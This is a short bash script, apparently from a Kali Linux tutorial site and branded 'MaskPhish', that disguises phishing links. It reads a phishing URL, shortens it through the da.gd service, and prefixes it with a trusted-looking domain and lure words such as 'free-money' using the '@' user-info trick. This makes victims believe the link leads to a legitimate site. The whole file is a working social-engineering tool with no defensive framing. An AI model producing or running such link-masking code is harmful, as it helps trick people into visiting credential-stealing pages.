# Bash Script for Hide Phishing URL
echo
echo
echo -e "\e[1;31;42m######┌──────────────────────────┐##### \e[0m"
echo -e "\e[1;31;42m######│▙▗▌      ▌  ▛▀▖▌  ▗    ▌  │##### \e[0m"
echo -e "\e[1;31;42m######│▌▘▌▝▀▖▞▀▘▌▗▘▙▄▘▛▀▖▄ ▞▀▘▛▀▖│##### \e[0m"
echo -e "\e[1;31;42m######│▌ ▌▞▀▌▝▀▖▛▚ ▌  ▌ ▌▐ ▝▀▖▌ ▌│##### \e[0m"
echo -e "\e[1;31;42m######│▘ ▘▝▀▘▀▀ ▘ ▘▘  ▘ ▘▀▘▀▀ ▘ ▘│##### \e[0m"
echo -e "\e[1;31;42m######└──────────────────────────┘##### \e[0m"
echo
echo -e "\e[40;38;5;82m Please Visit \e[30;48;5;82m https://www.kalilinux.in \e[0m"
echo -e "\e[30;48;5;82m    Copyright \e[40;38;5;82m   KaliKinuxIn \e[0m"
echo
echo
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m"
echo
echo -n "Paste Phishing URL here (with http or https): "
read phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo
echo -e "\e[1;31;42m ### Masking URL ###\e[0m"
echo 'URL to mask the Phishing URL (with http or https), ex https://google.com, http
://anything.org) :'
read mask
echo
echo 'Type social engineering words:(like free-money, best-pubg-tricks)'
echo
read words
echo
echo 'Generating MaskPhish Link...'
echo
echo 'Here is the MaskPhish URL..'
echo
final=$mask-$words@$shorter
echo $final


